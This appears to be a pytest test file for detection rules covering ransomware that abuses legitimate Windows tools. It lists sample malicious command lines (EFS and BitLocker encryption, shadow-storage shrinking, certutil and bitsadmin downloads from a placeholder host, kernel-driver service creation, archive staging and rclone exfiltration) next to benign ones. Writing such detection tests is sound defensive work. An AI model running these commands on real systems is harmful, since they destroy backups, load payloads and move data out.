"""
Tests for the new "ransomware via legitimate processes" cmdline rules
---------------------------------------------------------------------
Living-off-the-land encryption (cipher/BitLocker), LOLBin proxy execution
(certutil/bitsadmin/esentutl/wmic), BYOVD (sc create type=kernel), and
double-extortion staging (7z/rclone).  Every new rule must (a) fire on the
malicious cmdline, (b) NOT fire on a benign one, and (c) have an ATT&CK map.
"""

import pytest

import attack_map
from detectors.process_cmdline import evaluate_cmdline


def _names(proc, cmd):
    return [s.name for s in evaluate_cmdline("test", proc, cmd)]


MALICIOUS = [
    ("cipher_efs_encrypt",      "cipher.exe",   r"cipher /e C:\Users\v\Documents"),
    ("bitlocker_abuse_enable",  "powershell.exe", "Enable-BitLocker -MountPoint C:"),
    ("bitlocker_abuse_enable",  "manage-bde.exe", "manage-bde -on C: -pw"),
    ("vssadmin_resize_shadowstorage", "vssadmin.exe",
     "vssadmin resize shadowstorage /for=c: /maxsize=1MB"),
    ("certutil_download",       "certutil.exe", "certutil -urlcache -f http://e/x x"),
    ("certutil_decode_payload", "certutil.exe", "certutil -decode a.b64 a.exe"),
    ("bitsadmin_transfer",      "bitsadmin.exe", "bitsadmin /transfer j http://e/x x"),
    ("esentutl_raw_copy",       "esentutl.exe", r"esentutl /y C:\f.db /d out.db"),
    ("wmic_process_call_create","wmic.exe",     "wmic process call create calc.exe"),
    ("kernel_service_create",   "sc.exe",       r"sc create evil type= kernel binpath= C:\t\d.sys"),
    ("archive_password_staging","7z.exe",       r"7z a -psecret out.7z C:\data"),
    ("rclone_exfil",            "rclone.exe",   "rclone sync C:\\data remote:b"),
]

BENIGN = [
    ("cipher.exe",   "cipher /c report.docx"),
    ("certutil.exe", "certutil -hashfile setup.exe SHA256"),
    ("manage-bde.exe", "manage-bde -status C:"),
    ("7z.exe",       r"7z a backup.7z C:\data"),
    ("rclone.exe",   "rclone version"),
    ("wmic.exe",     "wmic process list brief"),
]


class TestMaliciousRulesFire:
    @pytest.mark.parametrize("rule,proc,cmd", MALICIOUS)
    def test_rule_fires(self, rule, proc, cmd):
        assert rule in _names(proc, cmd)


class TestBenignDoesNotFire:
    @pytest.mark.parametrize("proc,cmd", BENIGN)
    def test_no_new_rule_fires(self, proc, cmd):
        new_rules = {r for r, _, _ in MALICIOUS}
        assert not (set(_names(proc, cmd)) & new_rules)


class TestAttackMapped:
    @pytest.mark.parametrize("rule", sorted({r for r, _, _ in MALICIOUS}))
    def test_every_new_rule_has_attack_technique(self, rule):
        assert attack_map.techniques_for(rule), f"{rule} missing ATT&CK mapping"
